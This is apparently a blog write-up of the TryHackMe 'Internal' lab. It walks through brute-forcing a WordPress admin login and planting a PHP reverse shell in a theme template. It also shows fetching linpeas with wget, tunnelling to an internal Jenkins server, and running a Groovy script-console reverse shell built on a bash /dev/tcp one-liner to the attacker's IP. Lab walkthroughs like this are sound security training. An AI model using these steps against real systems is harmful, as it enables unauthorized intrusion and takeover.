>This room is rated hard and it simulates a real-world pentest. It involves enough enumeration on the web server which is our only way in. And less harmful files that have user passwords saved in them which gave us easy access to the machine.



## Let's get started
### Nmap scan
Started with my nmap scan to get open ports and services that might be running on our target system. I found that there are only two ports running, `22` and `80` that is `SSH` and a webserver `HTTP` respectively.
```bash
# Nmap 7.94 scan initiated Thu Jun 22 20:51:05 2023 as: nmap -A -T4 -sCV -v -oN nmap.log 10.10.148.198
Increasing send delay for 10.10.148.198 from 0 to 5 due to 19 out of 47 dropped probes since last increase.

### Directory bruteforcing
Since i know there is a web server running, i threw my `ffuf scan` to bruteforce for any hidden directories that might seem interesting. Right away i got two directories `blog` and `wordpress`.
```bash
┌──(prorat㉿prosec)-[~/hacks/thm/internal]

```
Going through the `blog` directory, seemed to be the base base url for the wordpress blog. I went futher to confirm whether the usual `wp-admin` page was there and i guess i wasn't wrong.

![image](/assets/img/Posts/internal/wp-admin.png)

Checking on the comments sections, i saw only one comment `Hello World` going through it, it shows that it was posted by user `admin`, interesting. We now have a possible user in our wordpress website. My wappalyzer told me the version of wordpress running is `5.4.2`. Unfortunately there was no exploit or substantial vulnerability that could help me root this machine.

Trying to login using `admin` and password `password` i get this interesting error `The password you entered for the username admin is incorrect` which tells me that we have the right username, and we probably should be worried about the password only this case.

![image](/assets/img/Posts/internal/login-error.png)

so
- [x]  username
- [x]  No exploit for wp version
- [x]  No subdomain

Throwing wpscan to enumerate and username and some other information abou the wordpress passively. We find that the wordpress theme is outdated, this will come in handy when we have access to the wordpress.
![image](/assets/img/Posts/internal/wp-theme.png)

What next? i guess its time we tried to bruteforce the login creds using username `admin` and password from the mighty `rockyou.txt`. `wpscan` can do that. Ran the command `wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt` and waited. Luckily, we got the password.

![image](/assets/img/Posts/internal/admin-creds.png)

## Initial access
We login using the admin credentials we got. We already know that the wordpress theme `twentyseventeen` is outdated, we can use that.
![image](/assets/img/Posts/internal/wp-dashboard.png)

Edit the `404.php template` to put our php reverse shell script from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell). Change the `IP address` to attacking box IP and the `port` that you will be listening on for a reverse shell.
![image](/assets/img/Posts/internal/rev.png)

Once we have that updated, we can access it in `/wp-content/themes/twentyseventeen/404.php`. We start our netcat listener 

```bash
┌──(prorat㉿prosec)-[~/hacks/thm/internal]
└─$ nc -nlvp 1337                
listening on [any] 1337 ...

```
We visit our php reverse shell script that we have planted in the innocent `404.php` template and boom we got a shell!!.

```bash
┌──(prorat㉿prosec)-[~/hacks/thm/internal]
└─$ nc -nlvp 1337                
listening on [any] 1337 ...

/bin/sh: 0: can't access tty; job control turned off
$ 
```
### Upgrading the shell
Start by finding which python version is installed in the machine by running `which python3`. Followed by `python3 -c 'import pty;pty.spawn("/bin/bash")'` to spawn a better-featured bash shell, then `export TERM=xterm` which gives us access to term commands. Then run `CTRL + z` to background the session and `stty raw -echo; fg` which turns off our own terminal echo which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes then finally `stty rows 38 columns 116`.
We now have a stable shell
```bash
www-data@internal:/$ ls
bin   cdrom  etc   initrd.img	   lib	  lost+found  mnt  proc  run   snap  swap.img  tmp  var      vmlinuz.old
boot  dev    home  initrd.img.old  lib64  media       opt  root  sbin  srv   sys       usr  vmlinuz
www-data@internal:/$ 
www-data@internal:/$ 

```
## Privilege Escalation - User

We are in as `www-data` user, we are now supposed to escalate our privileges to a shell user in the machine that is `aubreanna`.
![image](/assets/img/Posts/internal/users.png)

Of course you must have heard about `linpeas`. It is a privesc tool that does enumerations on a machine for potential escalation routes in seconds. Easy, dowload linpeas [here](https://github.com/carlospolop/PEASS-ng/releases/tag/20230618-1fa055b6) to your machine, start `python3 server` from where the linpeas file have been downloaded to.
```bash
┌──(prorat㉿prosec)-[~/hacks/thm/internal]
└─$ python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.250.90 - - [23/Jun/2023 09:52:42] "GET /linpeas.sh HTTP/1.1" 200 -

```
Use `wget` to download it to your preferred directory in your target (as long as you have write permissions mostsly is `/tmp` and `/dev/shm`), in the URL the host IP with be attacking machine.
```bash
www-data@internal:/tmp$ wget http://10.9.81.8/linpeas.sh

www-data@internal:/tmp$ 

```
Once it has been downloaded, make it executable using `chmod +x linpeas.sh` and run it `./linpeas.sh`.

Started going through the linpeas output, We find that it is a docker container, only two users with a console, `aubreanna` and `root`. Going further, we get database credentials from the wordpress config file.
![image](/assets/img/Posts/internal/db-creds.png)

>NB: Checked on the mysql database and it was a dead end, there were no credentials that could help escalate my privildeges.

And going through the output, we come accross one interesting file `wp-save.txt`.
![image](/assets/img/Posts/internal/susp-file.png)

Started find command to look for it and get an absolute path to its location in the file system. And in matters of second we get the path.
```bash
www-data@internal:/tmp$ find / -type f -name wp-save.txt 2>/dev/null
/opt/wp-save.txt

``` 

Reading it, we get`aubreanna` user password. 
![image](/assets/img/Posts/internal/user-cred.png)

### User flag
Now that we have aubreanna's password, we can proceed to login and retrieve the flag.
```bash
aubreanna@internal:/tmp$ cd ~
aubreanna@internal:~$ ls
jenkins.txt  snap  user.txt
aubreanna@internal:~$ cat user.txt
THM{redacted}
aubreanna@internal:~$ 
```
## Privilege Escalation - root
Reading the `jenkins.txt` file found in the home directory, we find that it is talking about a jenkins service that is running on `172.17.0.2` at port `8080`. Weird, cause it is not in our target machine. From ifconfig, our machine is running at `172.17.0.1`.
```bash
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080
aubreanna@internal:~$ ifconfig
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:65ff:fea3:95cd  prefixlen 64  scopeid 0x20<link>
        ether 02:42:65:a3:95:cd  txqueuelen 0  (Ethernet)
        RX packets 12  bytes 2245 (2.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 24  bytes 1806 (1.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```
### Port forwarding
Even if we try to access that docker IP and Port using our browser it will not be reachable. Therefore, to access it, we are going to use SSH tunneling technique to forward Jenkins `ip:port` to our attacker machine’s `ip:port`.
```bash
ssh -L 9000:172.17.0.2:8080 aubreanna@internal.thm
```
Then access the jenkins server by visiting the `localhost` at port `9000`. We are presented with login. From here i just let `hydra` bruteforce the password with `admin` as the user. And we got something.

![image](/assets/img/Posts/internal/jenkins-pass.png)

We login to jenkins.
![image](/assets/img/Posts/internal/jenkins-dash.png)

### Abusing groovy script console
>Jenkins has lovely Groovy script console that permits anyone to run arbitrary Groovy scripts inside the Jenkins master runtime. Groovy is a very powerful language which offers the ability to do practically anything Java can do.

We are going to use this to get a reverse shell on the docker environment. Go to `manage jenkins> script console`.

![image](/assets/img/Posts/internal/jenkins-console.png)

We first start our netcat listener on the port we will use in the rever shell script.
```bash
┌──(prorat㉿prosec)-[~/hacks/thm/internal]
└─$ nc -nlvp 1234                                                                              
listening on [any] 1234 ...

```
Then head to script console in our jenkins service and paste this script. 
>NOTE: You will need to put your IP and port in this one line bash reverse shell command `bash -c 'bash -i >& /dev/tcp/<attacking_IP>/port 0>&1'` and base64 encode it, then paste it in the `<base64_encoded_revshell>`.
```java
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,<base64_encoded_revshell>}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
![image](/assets/img/Posts/internal/jenkins-rev.png)

Then run the script and bingo we got a shell on the jenkins server, based on the user privilege escalation, we found a file that contained user password in the opt directory, How about now? We can check on the `/opt` directory and yes!! we have a `note.txt` file.
![image](/assets/img/Posts/internal/jenkins-opt.png)

Opening it, we get root's password.

![image](/assets/img/Posts/internal/root-pass.png)

### Root flag
Now that have the root's password, we can `ssh` to the machine or switch user(`su`) to root right from aubreanna's console.
```bash
aubreanna@internal:~$ su root
Password: 
root@internal:/home/aubreanna# cd /root
root@internal:~# ls
root.txt  snap
root@internal:~# cat root.txt
THM{redacted}

```

## Conclusion

This was one of the amazing machines that i have come across in tryhackme, with all the process from enumeration, intial access, enumeration again, take the jenkins service to our machine, enumerate again to get into the jenkins server where we got all we were looking for. 

GG to the creators and tryhackme. Thank you and i hope you enjoyed the write up.
